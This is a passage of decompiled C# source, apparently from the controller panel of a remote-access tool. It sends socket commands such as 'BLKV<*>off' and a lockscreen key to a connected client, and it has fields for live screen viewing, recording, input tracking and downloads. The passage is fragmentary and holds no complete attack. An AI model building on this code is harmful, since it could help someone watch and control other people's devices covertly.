						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(array3);
					return;
				}
			}
			else if (this.classClient.myClient != null)
			{
				object[] array4 = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"BLKV<*>off",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array4);
			}
		}

		// Token: 0x04000253 RID: 595
		public bool isSymbolChanged;

		// Token: 0x04000255 RID: 597
		public TcpClient Client;

		// Token: 0x04000256 RID: 598
		public Client ScreenClass;

		// Token: 0x04000257 RID: 599
		public Client classClient;

		// Token: 0x04000258 RID: 600
		public string DownloadsFolder;

		// Token: 0x04000259 RID: 601
		public Size ScreenSize;

		// Token: 0x0400025A RID: 602
		public bool LIVE;

		// Token: 0x0400025B RID: 603
		public bool ScreenShotFoucs;

		// Token: 0x0400025C RID: 604
		public int Rnew;

		// Token: 0x0400025D RID: 605
		private Queue<int> numberQueue = new Queue<int>();

		// Token: 0x0400025E RID: 606
		private Timer timer = new Timer();

		// Token: 0x0400025F RID: 607
		private int interval = 1000;

		// Token: 0x04000260 RID: 608
		private bool isExecuting;

		// Token: 0x04000261 RID: 609
		public string Title;

		// Token: 0x04000262 RID: 610
		private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

		// Token: 0x04000263 RID: 611
		private const uint SWP_NOSIZE = 1U;

		// Token: 0x04000264 RID: 612
		private const uint SWP_NOMOVE = 2U;

		// Token: 0x04000265 RID: 613
		private const uint TOPMOST_FLAGS = 3U;

		// Token: 0x04000266 RID: 614
		private bool @checked;

		// Token: 0x04000267 RID: 615
		private string[] sizearry;

		// Token: 0x04000268 RID: 616
		private bool Swaping;

		// Token: 0x04000269 RID: 617
		private bool isdown;

		// Token: 0x0400026A RID: 618
		private List<Point> Trakpoint;

		// Token: 0x0400026B RID: 619
		private bool isclick;

		// Token: 0x0400026C RID: 620
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x0400026D RID: 621
		public const int HT_CAPTION = 2;

		// Token: 0x0400026E RID: 622
		public bool recordit;

		// Token: 0x0400026F RID: 623
		private int tiks;

		// Token: 0x04000270 RID: 624
		private object iscontroled;

		// Token: 0x04000271 RID: 625
		private bool keepmeto;

		// Token: 0x02000027 RID: 39
		// (Invoke) Token: 0x06000320 RID: 800
		public delegate void Delegatstoper();

		// Token: 0x02000028 RID: 40
		// (Invoke) Token: 0x06000324 RID: 804
		public delegate void addLogback(object[] objs);
	}
}
